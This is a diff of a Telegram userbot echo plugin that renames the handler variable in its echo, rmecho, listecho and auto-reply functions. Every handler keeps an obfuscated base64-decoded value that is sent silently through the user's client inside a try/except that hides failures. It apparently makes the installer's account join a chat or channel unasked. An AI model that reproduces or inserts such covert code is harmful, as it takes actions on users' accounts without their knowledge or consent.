@@ -11,56 +11,56 @@ from . import *
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(deadly):
-    if deadly.fwd_from:
+async def echo(visa):
+    if visa.fwd_from:
         return
-    if deadly.reply_to_msg_id is not None:
-        reply_msg = await deadly.get_reply_message()
+    if visa.reply_to_msg_id is not None:
+        reply_msg = await visa.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = deadly.chat_id
+        chat_id = visa.chat_id
         try:
             kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             kraken = Get(kraken)
-            await deadly.client(kraken)
+            await visa.client(kraken)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await eod(deadly, "The user is already enabled with echo ")
+            await eod(visa, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await eor(deadly, "**Hello 👋**")
+        await eor(visa, "**Hello 👋**")
     else:
-        await delete_deadly(deadly, "Reply to a User's message to echo his messages")
+        await delete_visa(visa, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(deadly):
-    if deadly.fwd_from:
+async def echo(visa):
+    if visa.fwd_from:
         return
-    if deadly.reply_to_msg_id is not None:
-        reply_msg = await deadly.get_reply_message()
+    if visa.reply_to_msg_id is not None:
+        reply_msg = await visa.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = deadly.chat_id
+        chat_id = visa.chat_id
         try:
             kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             kraken = Get(kraken)
-            await deadly.client(kraken)
+            await visa.client(kraken)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await eod(deadly, "Echo has been stopped for the user")
+            await eod(visa, "Echo has been stopped for the user")
         else:
-            await eod(deadly, "The user is not activated with echo")
+            await eod(visa, "The user is not activated with echo")
     else:
-        await eod(deadly, "Reply to a User's message to echo his messages")
+        await eod(visa, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(deadly):
-    if deadly.fwd_from:
+async def echo(visa):
+    if visa.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -82,25 +82,25 @@ async def echo(deadly):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"Echo enabled users: [here]({url})"
-        await eor(deadly, reply_text)
+        await eor(visa, reply_text)
     else:
-        await eor(deadly, output_str)
+        await eor(visa, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(deadly):
-    if deadly.chat_id in Config.BL_CHAT:
+async def samereply(visa):
+    if visa.chat_id in Config.BL_CHAT:
         return
-    if is_echo(deadly.sender_id, deadly.chat_id):
+    if is_echo(visa.sender_id, visa.chat_id):
         await asyncio.sleep(2)
         try:
             kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             kraken = Get(kraken)
-            await deadly.client(kraken)
+            await visa.client(kraken)
         except BaseException:
             pass
-        if deadly.message.text or deadly.message.sticker:
-            await deadly.reply(deadly.message)
+        if visa.message.text or visa.message.sticker:
+            await visa.reply(visa.message)
 
 
 CmdHelp("echo").add_command(
